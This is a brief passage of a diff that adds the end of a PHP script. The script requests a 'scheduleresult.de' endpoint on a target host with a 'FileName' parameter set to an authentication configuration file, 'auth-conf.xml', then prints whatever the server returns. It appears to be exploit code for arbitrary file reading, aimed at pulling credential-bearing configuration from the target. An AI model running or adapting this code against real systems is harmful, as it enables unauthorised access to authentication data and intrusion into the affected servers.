+    $url = "https://$host:$port/scheduleresult.de/?FileName=".urlencode("conf\Authentication\auth-conf.xml");
+    $out = _s($url, 1, "", "");
+    print($out);	
+}
+?>
